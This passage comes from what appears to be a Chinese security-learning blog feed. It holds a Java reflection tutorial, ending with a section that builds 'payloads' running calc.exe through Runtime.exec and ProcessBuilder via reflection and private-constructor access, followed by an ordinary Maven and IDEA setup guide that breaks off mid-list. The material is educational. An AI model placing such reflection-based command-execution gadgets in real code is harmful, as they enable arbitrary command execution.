class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类中定义了<code>hello()</code>方法，并且它的子类Student覆写了<code>hello()</code>方法，而尽管m是通过从<code>Person.class</code>获取的<code>Method</code>，由于<strong>实际调用时JVM会根据对象的实际类型进行动态绑定</strong>。所以作用于<code>Student</code>实例时，同样遵循多态原则，实际调用Student类的<code>hello()</code>方法。</p><h3 id="调用构造方法"><a href="#调用构造方法" class="headerlink" title="调用构造方法"></a>调用构造方法</h3><p>Java的<strong>反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。</strong></p><p>通过Class实例获取Constructor的方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getConstructor(Class...): 获取某个<span class="keyword">public</span>的Constructor</span><br><span class="line"><span class="title function_">getDeclaredConstructor</span><span class="params">(Class...)</span>: 获取某个Constructor</span><br><span class="line"><span class="title function_">getConstructors</span><span class="params">()</span>: 获取所有<span class="keyword">public</span>的Constructor</span><br><span class="line"><span class="title function_">getDeclaredConstructors</span><span class="params">()</span>: 获取所有Constructor</span><br></pre></td></tr></table></figure><p>调用非public的Constructor时，必须先通过<code>setAccessible(true)</code>设置允许访问。</p><h2 id="获取继承关系"><a href="#获取继承关系" class="headerlink" title="获取继承关系"></a>获取继承关系</h2><p>获取父类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.getSuperclass()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class cls=Student.class.getSuperclass();</span><br><span class="line">System.out.println(cls.getName()); <span class="comment">//Person</span></span><br></pre></td></tr></table></figure><p>获取接口interface:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.getInterface()</span><br></pre></td></tr></table></figure><h2 id="利用反射命令执行"><a href="#利用反射命令执行" class="headerlink" title="利用反射命令执行"></a>利用反射命令执行</h2><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a><code>Runtime</code></h3><p>在<code>java.long.Runtime</code>中可以通过exec方法执行本地命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>同样我们也能用反射实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Class.newInstance()</code>的作用是创建实例调用这个类的无参构造函数，但执行后发现报错<code>IllegalAccessException</code>，产生的原因可能有两点：</p><ul><li><strong>使用的类没有无参构造方法</strong></li><li><strong>使用的无参构造方法是私有的</strong></li></ul><p>而其中<code>Runtime</code>类的无参构造方法是私有的，且禁止外部直接通过new实例化：</p><p><img src="/archives/adc18de0/QQ20250330-175022.png"></p><p>同时发现<code>Runtime.exec</code>方法有六个重载，这里使用最简单的<code>exec(String command)</code>即可：</p><p><img src="/archives/adc18de0/QQ20250330-175328.png"></p><p>可以看到该重载方法只有一个参数且为String类型。</p><p>注意到<code>Runtime</code>类有一个<code>getRuntime</code>方法可以获取Runtime对象，且该方法是公有的：</p><p><img src="/archives/adc18de0/QQ20250330-175949.png"></p><p>所以我们可以通过使用<code>cls.getMethod(&quot;exec&quot;, String.class);</code>获取<code>Runtime.exec</code>方法，<code>Runtime.getRuntime()</code>用来获取<code>Runtime</code>对象，从而执行<code>Runtime.exec</code>方法</p><p>由于<code>Runtime.getRuntime()</code>是一个静态方法，所以在invoke调用时，第一个参数要传入一个<code>Runtime</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        m.invoke(cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(cls), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先m获取<code>Runtime.exec</code>方法，要调用invoke，则第一个参数为实例对象，而<code>cls.getMethod(&quot;getRuntime&quot;)</code>获取<code>Runtime.getRuntime</code>方法，通过调用invoke返回<code>Runtime</code>对象作为<code>m.invoke</code>的第一个参数，由于getRuntime为静态方法，所以参数为一个类即cls</p><p>还可以<strong>利用设置<code>setAccessible(true)</code>修改构造方法访问权限实现暴力访问权限</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        Constructor c=cls.getDeclaredConstructor();</span><br><span class="line">        c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(c.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a><code>ProcessBuilder</code></h3><p>ProcessBuilder有两个构造函数：</p><p><img src="/archives/adc18de0/QQ20250330-183657.png"></p><p>利用第一种形式的构造函数，我们可以在<code>getConstructor</code>处传入<code>List.class</code>，获取<code>start</code>方法执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        m.invoke(cls.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理就是由于ProcessBuilder类中存在接受List参数的构造方法，由于Java泛型的类型擦除，反射时<code>List.class</code>对应<code>List&lt;String&gt;</code>、<code>List&lt;Integer&gt;</code>等所有泛型形式。所以通过<code>cls.getConstructor(List.class)</code>来获取第一种形式构造方法，然后再通过获取的构造方法创建实例，这里直接将我们的<strong>命令通过<code>Arrays.asList()</code>封装成List对象</strong>，然后调用<code>start()</code>方法启动进程执行命令</p><p>分解下我们的payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        Constructor c=cls.getConstructor(List.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> c.newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line">        m.invoke(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然我们也可以利用第二种形式的构造函数，<strong>对于可变长参数，Java其实在编译时会编译成一个数组</strong>，也就是说，如下两种写法其实是等价的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>对于反射来说，如果要获取的目标函数里包含可变长参数，我们可以直接认为是数组。</p><p>思路还是不变的，通过start进程启动命令即可，我们可将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>即可，同时注意在创建实例时注意构造函数接收的是可变长参数，而我们传给<code>ProcessBuilder</code>的是一个<code>List&lt;String&gt;</code>类型，二者叠加为一个一个二维数组，如果传一维数组会导致多个String参数报错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><blockquote><p>由于newInstance接收一个<code>Object</code>数组，数组每个元素对应构造函数的一个参数，所以newInstance要求参数是<code>object[]</code>，写入<code>new String[][]&#123;&#123;"cmd"&#125;&#125;</code>可等效于<code>new Object[]&#123;String[]&#123;&quot;cmd&quot;&#125;&#125;</code></p></blockquote><p>反射payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        m.invoke(cls.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分解payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        Constructor c=cls.getConstructor(String[].class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> c.newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;);</span><br><span class="line">        m.invoke(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用反射修改final关键字修饰的成员变量"><a href="#利用反射修改final关键字修饰的成员变量" class="headerlink" title="利用反射修改final关键字修饰的成员变量"></a>利用反射修改final关键字修饰的成员变量</h2><ul><li><p><strong>反射获取Field类的字段修饰符modifiers</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field modifiers=field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>设置modifiers修改权限</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>修改成员变量的Field对象的modifiers值</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br></pre></td></tr></table></figure></li><li><p><strong>修改成员变量值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/ElloeStudy/p/16065219.html">https://www.cnblogs.com/ElloeStudy/p/16065219.html</a></p><p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">https://www.javasec.org/javase/Reflection/Reflection.html</a></p><p><a href="https://pdai.tech/md/java/basic/java-basic-x-reflection.html#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%B0%8F%E7%BB%93">https://pdai.tech/md/java/basic/java-basic-x-reflection.html#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%B0%8F%E7%BB%93</a></p><p><a href="https://nivi4.notion.site/Java-8e0ad38312714da48ec396a6544dd3d2#cc9b11b89ca84dbb81065621377306a6">https://nivi4.notion.site/Java-8e0ad38312714da48ec396a6544dd3d2#cc9b11b89ca84dbb81065621377306a6</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA使用配置教程</title>
      <link href="/archives/1162dac4/"/>
      <url>/archives/1162dac4/</url>
      
        <content type="html"><![CDATA[<h2 id="MAVEN配置"><a href="#MAVEN配置" class="headerlink" title="MAVEN配置"></a>MAVEN配置</h2><h3 id="什么是MAVEN"><a href="#什么是MAVEN" class="headerlink" title="什么是MAVEN"></a>什么是MAVEN</h3><p><strong>Apache Maven</strong> 是一个基于 <strong>POM（Project Object Model，项目对象模型）</strong> 的 <strong>项目管理与构建工具</strong>，主要用于 <strong>Java 项目</strong>，但也支持其他语言（如 C#、Ruby 等）。它的核心目标是简化项目的构建、依赖管理和标准化开发流程。</p><h3 id="MAVEN下载"><a href="#MAVEN下载" class="headerlink" title="MAVEN下载"></a>MAVEN下载</h3><p>访问maven官网：**<a href="https://maven.apache.org/">MAVEN官网</a>**</p><p><img src="/archives/1162dac4/QQ20250307-213749.png"></p><p>点击download，windows点图中的链接下载：</p><p><img src="/archives/1162dac4/QQ20250307-213914.png"></p><p>将下载的压缩包解压即可</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>打开解压后的文件，复制好<strong>apache-maven</strong>的路径：</p><p><img src="/archives/1162dac4/QQ20250307-214605.png"></p><p>打开环境变量设置：<strong>设置-&gt;查看高级系统设置-&gt;环境变量</strong></p><p>点新建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名称：MAVEN_HOME</span><br><span class="line">值：复制的apache-maven路径</span><br></pre></td></tr></table></figure><p><img src="/archives/1162dac4/QQ20250307-214952.png"></p><p>找到path：<strong>编辑-&gt;新建</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%MAVEN_HOME%\bin</span><br></pre></td></tr></table></figure><p>确定即可，然后查看是否配置成功，win+R运行cmd，输入<strong>mvn -version</strong>，如图所示则配置成功：</p><p><img src="/archives/1162dac4/QQ20250307-215331.png"></p><h3 id="配置本地仓库"><a href="#配置本地仓库" class="headerlink" title="配置本地仓库"></a>配置本地仓库</h3><p>由于Maven默认的远程仓库在国外，导致下载jar包时速度非常慢，这里推荐使用国内的<strong>阿里云仓库</strong>，可以提高访问和下载速度。</p><p>首先在maven目录新建一个mvn_rep作为我们的本地仓库，并复制该目录路径<code>D:\apache-maven-3.9.9\apache-maven-3.9.9\mvn_rep</code></p><p><img src="/archives/1162dac4/QQ20250307-220147.png"></p><p>修改<code>conf/settings.xml</code>中的<code>&lt;localRepository&gt;</code>为一个指定目录：</p><p><img src="/archives/1162dac4/QQ20250307-220616.png"></p><blockquote><p>添加后ctrl+s保存即可</p></blockquote><p>然后我们<strong>配置阿里云服务器镜像</strong>，修改conf&#x2F;settings.xml中的标签，为其添加如下子标签，完成后ctrl+s保存退出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 阿里云仓库 --&gt;</span><br><span class="line">&lt;mirror&gt;</span><br><span class="line">&lt;id&gt;alimaven&lt;/id&gt;</span><br><span class="line">&lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">&lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class="line">&lt;url&gt;http://maven.aliyun.com/nexus/content/repositories/central/&lt;/url&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br></pre></td></tr></table></figure><p><img src="/archives/1162dac4/QQ20250307-220921.png"></p><p><img src="/archives/1162dac4/QQ20250307-221256.png"></p><h3 id="配置jdk"><a href="#配置jdk" class="headerlink" title="配置jdk"></a>配置jdk</h3><p><strong>在之前这个</strong> <strong>settings.xml</strong> <strong>文件中找到</strong> <strong>profiles</strong> <strong>节点</strong>：</p><p><img src="/archives/1162dac4/"><img src="/archives/1162dac4/QQ20250307-221655.png" alt="QQ20250307-221655"></p><p>添加如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- java版本 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/archives/1162dac4/QQ20250307-221836.png"></p><p><strong>查看是否配置成功，win+R快捷键运行cmd，输入 mvn help:system测试：</strong></p><p><img src="/archives/1162dac4/QQ20250307-222022.png"></p><p>如果出现下载很多文件的页面，即配置成功</p><p>因为如果第一次执行mvn help:system命令，Maven相关工具会自动到Maven中央仓库下载缺失的或者Maven中央仓库更新的各种配置文件和类库（jar包）到maven本地仓库中。</p><p>下载完成后，mvn help:system 命令会打印出所有的<strong>Java系统属性和环境变量</strong></p><h2 id="IDEA使用"><a href="#IDEA使用" class="headerlink" title="IDEA使用"></a>IDEA使用</h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><ul><li><p><strong>psvm+tab键&#x2F;main+yab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args)</span><br></pre></td></tr></table></figure><blockquote><p>打出psvm后按下tab即可</p></blockquote></li><li><p><strong>sout+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println()</span><br></pre></td></tr></table></figure></li><li><p><strong>Ctrl+X：删除当前行</strong></p></li><li><p><strong>Ctrl+D：复制当前行，也可复制多行</strong></p></li><li><p><strong>Alt+Insert(或右键Generate)：生成代码(如get,set方法,构造函数等)</strong></p></li><li><p><strong>Ctrl+Alt+T：生成try catch(或者 Alt+enter选择函数如if,else)</strong></p></li><li><p><strong>ctrl+shift+U：实现大小写之间的转换</strong></p></li><li><p><strong>alt+回车：导入包，自动修正</strong></p></li><li><p><strong>ctrl+alt+L：格式化代码</strong></p></li><li><p><strong>ctrl+alt+I：自动缩进</strong></p></li><li><p><strong>fori：生成for (int i &#x3D; 0; i &lt; ; i++) {}</strong></p></li><li><p><strong>ctrl+鼠标点击：快速找到成员变量的出处或函数定义</strong></p></li><li><p><strong>shift+F6：重构&#x2F;重命名 (包、类、方法、变量、甚至注释等)</strong></p></li><li><p><strong>ctrl+Q：查看当前方法的声明</strong></p></li><li><p><strong>ctrl+alt+V：自动创建变量（new 对象();之后选择按快捷键）</strong></p></li><li><p><strong>ctrl+O：重写方法</strong></p></li><li><p><strong>ctrl+I：实现方法</strong></p></li><li><p><strong>alt+&#x2F;：代码注释（采用&#x2F;&#x2F;注释）</strong></p></li><li><p><strong>ctrl+shift+&#x2F;：代码注释(采用&#x2F;</strong>&#x2F;注释)**</p></li><li><p><strong>ctrl+shift+R：在当前项目中替换指定内容</strong></p></li><li><p><strong>ctrl+P：显示方法参数信息</strong></p></li><li><p><strong>ctrl+shift+insert：查看历史复制记录，idea可以保留历史复制的 100 条记录</strong></p></li></ul><h4 id="控制台语句相关"><a href="#控制台语句相关" class="headerlink" title="控制台语句相关"></a>控制台语句相关</h4><ul><li><p><strong>sout+tab键</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println()</span><br></pre></td></tr></table></figure><blockquote><p>输出到控制台语句并换行。</p></blockquote></li><li><p><strong>souf+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(&quot;&quot;);</span><br></pre></td></tr></table></figure></li><li><p><strong>soutm+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;当前类名.方法名&quot;)</span><br></pre></td></tr></table></figure></li><li><p><strong>soutp+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(当前方法所有方法参数名+值)</span><br></pre></td></tr></table></figure></li></ul><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><ul><li><strong>Ctrl + F：在当前文件进行文本查找</strong></li><li><strong>Ctrl + R：在当前文件进行文本替换</strong></li><li><strong>Shift + Ctrl + F：在项目进行文本查找</strong></li><li><strong>Shift + Ctrl + R：在项目进行文本替换</strong></li><li><strong>Shift + Shift：快速搜索（可同时代替下面三个快捷键）</strong></li><li><strong>Ctrl + N：查找class</strong></li><li><strong>Ctrl + Shift + N：查找文件</strong></li><li><strong>Ctrl + Shift + Alt + N：查找symbol（查找某个方法名）</strong></li></ul><h4 id="跳转切换"><a href="#跳转切换" class="headerlink" title="跳转切换"></a>跳转切换</h4><ul><li><strong>Ctrl + E：最近文件</strong></li><li><strong>Ctrl + Tab：切换文件</strong></li><li><strong>Ctrl + Alt + ←&#x2F;→：跳转历史光标所在处</strong></li><li><strong>Alt + ←&#x2F;→ 方向键：切换子tab</strong></li><li><strong>Ctrl + 